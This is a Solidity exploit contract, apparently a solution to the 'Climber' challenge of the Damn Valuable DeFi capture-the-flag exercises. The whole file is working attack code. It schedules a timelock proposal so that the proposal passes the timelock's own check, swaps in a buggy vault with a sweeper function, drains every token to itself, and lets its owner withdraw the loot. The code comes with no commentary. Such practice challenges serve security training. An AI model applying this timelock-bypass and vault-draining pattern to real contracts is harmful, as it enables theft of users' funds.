// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./BuggyVault.sol";
import "../../DamnValuableToken.sol";

import "../../climber/ClimberTimelock.sol";

contract AttackTimelock {
    address vault;
    address payable timelock;
    address token;

    address owner;

    bytes[] private scheduleData;
    address[] private targets;

    bytes32 salt = keccak256("attack proposal");

    constructor(address _vault, address payable _timelock, address _token, address _owner) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        owner = _owner;
    }

    function setScheduleData(address[] memory _targets, bytes[] memory data) external {
        targets = _targets;
        scheduleData = data;
    }

    function exploit() external {
        uint256[] memory emptyData = new uint256[](targets.length);
        ClimberTimelock(timelock).schedule(targets, emptyData, scheduleData, salt);

        BuggyVault(vault).setSweeper(address(this));
        BuggyVault(vault).sweepFunds(token);
    }

    function withdraw(address recovery) external {
        require(msg.sender == owner, "not owner");
        DamnValuableToken(token).transfer(recovery, DamnValuableToken(token).balanceOf(address(this)));
    }
}
